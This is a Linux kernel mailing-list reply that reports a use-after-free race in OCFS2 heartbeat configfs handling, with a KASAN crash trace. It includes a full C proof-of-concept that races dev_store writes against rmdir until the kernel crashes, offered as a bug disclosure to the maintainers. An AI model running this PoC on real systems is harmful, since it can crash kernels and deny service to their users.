Received: from out203-205-221-240.mail.qq.com (out203-205-221-240.mail.qq.com [203.205.221.240])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 36C0640D567
	for <ocfs2-devel@lists.linux.dev>; Sun, 21 Jun 2026 11:17:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.240
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782040650; cv=none; b=Sv2njcBU4NtK5xyYNCzBYlHjId5+tI5FRB/f09O99rCfL2JL7KTbRNAoG7xOIXn+VjMXa6P5A+xCXX/8bx9fz9cmSosVsD99oZOZWNtltXuWcIB8yjjqJNK5HnFLle7ejFdFVpjFJ+V6z4CqK7Awrhk+/zhw1MsA1ixXIY1olrI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782040650; c=relaxed/simple;
	bh=EFrxF+/mjhb7UgjeUeCv5W708L38npFahFOOHRlIRGE=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=L/q/4GrVKfH80WJD4fpR/U/C6ntHqv7IXiMcJI+Q/oaX5FrQEKzXZfyyKrpdAUearJ9/nOYrH9+pgWLe4nBscUEQlUnNPXhNdJATq/YrdZm543J5YdDsK5KDUxJFbYQvJtcghjRNKYKioRDIOyyKnQzyt04t0rUZnhMRK4+jicY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=optdd4MY; arc=none smtp.client-ip=203.205.221.240
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="optdd4MY"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782040640; bh=rwLP6yxb6+iG4iFe1Vf+cKyMCEdTO5cNqonXeT+PH1U=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=optdd4MYBADvCTowV6pz63YALBy9MMn37SK/t1yFShrXAe/hSSVz4YClnbE7yDwQ0
	 Ql2/gKugOV+0/Tg+C+6fr0Fyupc3OXMfIdHkkI0oUylf2rVD1faYfV+Tr2fzGOZWLX
	 Op96bGsT+UKx144JJzq0Ze7m02VAsxQ6WO9K1gto=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrszc50-0.qq.com (NewEsmtp) with SMTP
	id 451B02AE; Sun, 21 Jun 2026 19:17:17 +0800
X-QQ-mid: xmsmtpt1782040637t3xdisrk7
Message-ID: <tencent_816334CA5919146F5C3206F237A218DC4706@qq.com>
X-QQ-XMAILINFO: MiyqkkalqRRF3V9sJbPbvn5i1rz6ctQvBsuGbVNFeWpX6yk1LbSx2wWMSxlG00
	 RS7IVP2N7mhXKcqXiQ2qofD1V5UGJO942VQzQVxCZd8JNV9L5NDf3ZflidBj/vA+6CZ40yXJ4B9G
	 eZTIN4euBVZSkxElNeKQBwDIqzuadeEClY98rpHPHZ9a5ua/igft+tQOKCF9fc6QKnz6ZqM6H3pH
	 U6oTgbrqKiBf1lgQ++3sn3Soe8JJ+asxPzSOMGIoIzRjfirDjJe5+noONx536I8UO780UV/WFuDK
	 4wSd6oEQAJeFNwtgrkbTIZ65ViOqt3tWtgm7dctJqLUy95cdduWoK2+w0gNOJj+55IpcAxiLjV4S
	 zuW8IBSo8oEWiDrpJzyfLPo2wNhoIiq7ndBlOPWf0WykMUZIOaHThjL033b8LpLIRkTes6ldt7hS
	 DIyKCpJ5hxuxKM8XK33RGAGB7Fo2gGPRuqs3sqMZEA6p+p20SLoL5azmGeQWyicRDpajC5BiZa+H
	 tnnzf7KXKyItGhw2kFAi6AHu7zmmrOuZ4v+fzkvf9m1S7O5EaquxJgJVbUWCCOgkPl+PEnVdp39n
	 sSAbwuiShzFYPV7xzuoldAgg7UsKbutR6PQlVvQB7yczmx2kSqqEHxZuJiD/8MlU4ymMcNV70/pq
	 Zapi/Z/PkdJSF693TBd3zOYNefKTVHIg5Le8IPnuZcmVjlu0JUnqrqrL1uDSEAsre4zrbG9b5WSl
	 nuEPioLIKx8LDLR04DqMea5WQ4J6CJcNwm2tZ5/2nKkTUH1IX+ccqALhrlGGwE5um/fTGT9FioxC
	 i3qHOixBwt93amKAF++zgqlSXN5d8FoM421uKIWkg945D/zJ3O5dTf+/5gdqeKqrGwU/M18kvcTe
	 WxMj/wVoEw03iGwT/5FvIaHfrv87nrxopBwQ7EF7jiJja6QpijrH1vhFzqId2Q7rE4r5SYtA3epT
	 yddSz1viyeukEJVa+OQSsRxZYQgW+tIMunL4GnUfCFxMkhBpY85Q45CitIAi4K663FV40oNlHNG+
	 wIx83eaYwD64osLw0fAXibi9/LkJfmO7M06XGoeQwxHYPVKSt2P9Zc1+CDbK0yxrlsfwbZKw==
X-QQ-XMRINFO: Nq+8W0+stu50tPAe92KXseR0ZZmBTk3gLg==
X-OQ-MSGID: <a97abeaf-4c7b-4717-9cd2-51920085d1c5@qq.com>
Date: Sun, 21 Jun 2026 19:17:15 +0800
Precedence: bulk
X-Mailing-List: ocfs2-devel@lists.linux.dev
List-Id: <ocfs2-devel.lists.linux.dev>
List-Subscribe: <mailto:ocfs2-devel+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:ocfs2-devel+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH] ocfs2/cluster: reject local node clears while heartbeat
 runs
To: Cen Zhang <zzzccc427@gmail.com>, Mark Fasheh <mark@fasheh.com>,
 Joel Becker <jlbec@evilplan.org>, Joseph Qi <joseph.qi@linux.alibaba.com>
Cc: ocfs2-devel@lists.linux.dev, linux-kernel@vger.kernel.org,
 baijiaju1990@gmail.com
References: <20260614053345.64053-1-zzzccc427@gmail.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260614053345.64053-1-zzzccc427@gmail.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi Cen,

I saw the discussion with Joseph about the v2 fixes.  Before v2 goes out,
I wanted to flag a pre-existing race condition that a Sashiko AI code
review [1] found in the same function.

The `o2hb_region_dev_store()` error path can race with
`o2hb_heartbeat_group_drop_item()` (triggered by rmdir) because configfs
allows concurrent store() and drop_item().  If drop_item() tears down the
region while dev_store is in its error path, the subsequent
`fput(reg->hr_bdev_file)` hits a use-after-free.

I was able to reproduce this in QEMU with KASAN by forking multiple
children to race dev_store writes against rmdir on the same heartbeat
region.

On Sun, Jun 14, 2026 at 01:33:45PM +0800, Cen Zhang wrote:
 > Track the heartbeat start/run/stop window with a per-region active
 > flag protected by o2hb_live_lock. This prevents o2nm_node_local_store()
 > from clearing the local node while heartbeat threads are still active.

The `hr_heartbeat_active` flag protects against the node clear race,
but the error path in `dev_store` can still race with `drop_item()`
via configfs concurrency:

```c
// dev_store() error path after configfs has accepted the write:
// at this point, drop_item() can run in parallel via rmdir
fput(reg->hr_bdev_file);  // UAF if drop_item() already freed it
```

[KASAN report — kernel 7.1.0-rc7-next-20260612, CONFIG_KASAN=y]

   BUG: KASAN: null-ptr-deref in fput+0x33/0x100
   BUG: kernel NULL pointer dereference, address: 0000000000000158
   Oops: Oops: 0002 [#1] SMP KASAN NOPTI

   Call Trace:
    <TASK>
    fput+0x33/0x100
    o2hb_region_dev_store+0x1327/0x1da0
    configfs_write_iter+0x.../...
    vfs_write+0x.../...
    ksys_write+0x.../...
    do_syscall_64+0xcd/0xf80
    entry_SYSCALL_64_after_hwframe+0x77/0x7f

The crash is `fput()` on a region that was already freed by a concurrent
`drop_item()`.  The `dev_store` error path calls `fput(reg->hr_bdev_file)`,
but `drop_item()` already tore down the region via rmdir — the NULL deref
is the symptom of the use-after-free.

Full PoC source (poc.c):
---8<----------------------------------------------------------------
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <string.h>
#include <stdlib.h>

#define CFG "/sys/kernel/config/cluster/poccluster"

int main(void)
{
     char p[256], loopdev[64] = "/dev/loop0";
     printf("[*] OCFS2 heartbeat PoC\n");

     system("dd if=/dev/zero of=/tmp/hb.img bs=1M count=30 2>/dev/null");
     system("losetup -f /tmp/hb.img 2>/dev/null");
     FILE *fp = popen("losetup -j /tmp/hb.img -O NAME "
                      "--noheadings 2>/dev/null", "r");
     if (fp && fgets(loopdev, sizeof(loopdev), fp))
         loopdev[strcspn(loopdev, "\n")] = 0;
     if (fp) pclose(fp);

     snprintf(p, sizeof(p), CFG); mkdir(p, 0755);
     snprintf(p, sizeof(p), CFG "/node/mynode"); mkdir(p, 0755);
     int fd = open(CFG "/node/mynode/ipv4_address", O_WRONLY);
     if (fd >= 0) { write(fd, "127.0.0.1", 9); close(fd); }
     fd = open(CFG "/node/mynode/ipv4_port", O_WRONLY);
     if (fd >= 0) { write(fd, "7777", 4); close(fd); }
     fd = open(CFG "/node/mynode/num", O_WRONLY);
     if (fd >= 0) { write(fd, "0", 1); close(fd); }
     fd = open(CFG "/node/mynode/local", O_WRONLY);
     if (fd >= 0) { write(fd, "1", 1); close(fd); }

     for (int i = 0; i < 100; i++) {
         snprintf(p, sizeof(p), CFG "/heartbeat/reg");
         if (mkdir(p, 0755) < 0) { rmdir(p); usleep(1000); continue; }

         fd = open(CFG "/heartbeat/reg/block_bytes", O_WRONLY);
         if (fd >= 0) { write(fd, "512", 3); close(fd); }
         fd = open(CFG "/heartbeat/reg/start_block", O_WRONLY);
         if (fd >= 0) { write(fd, "1", 1); close(fd); }
         fd = open(CFG "/heartbeat/reg/blocks", O_WRONLY);
         if (fd >= 0) { write(fd, "4", 1); close(fd); }

         int loop_fd = open(loopdev, O_RDWR);
         if (loop_fd < 0) { usleep(1000); continue; }

         pid_t pids[7];
         for (int j = 0; j < 7; j++) {
             pids[j] = fork();
             if (pids[j] == 0) {
                 if (j < 4) {
                     /* dev_store writers */
                     usleep(j * 20);
                     char fdstr[16];
                     snprintf(fdstr, sizeof(fdstr), "%d", loop_fd);
                     snprintf(p, sizeof(p), CFG "/heartbeat/reg/dev");
                     int dev_fd = open(p, O_WRONLY);
                     if (dev_fd >= 0) {
                         write(dev_fd, fdstr, strlen(fdstr));
                         close(dev_fd);
                     }
                 } else {
                     /* rmdir — triggers drop_item() */
                     usleep(j * 30);
                     snprintf(p, sizeof(p), CFG "/heartbeat/reg");
                     rmdir(p);
                 }
                 _exit(0);
             }
         }
         close(loop_fd);
         for (int j = 0; j < 7; j++) { int st; waitpid(pids[j], &st, 0); }
         snprintf(p, sizeof(p), CFG "/heartbeat/reg"); rmdir(p);
     }
     printf("[*] Done. Check dmesg.\n");
     return 0;
}
---8<----------------------------------------------------------------
Compile: gcc -o poc poc.c

[1] 
https://sashiko.dev/#/patchset/20260614053345.64053-1-zzzccc427%40gmail.com
     (Sashiko AI code review — "Use-After-Free", Severity: Critical)

Thanks,
XIAO


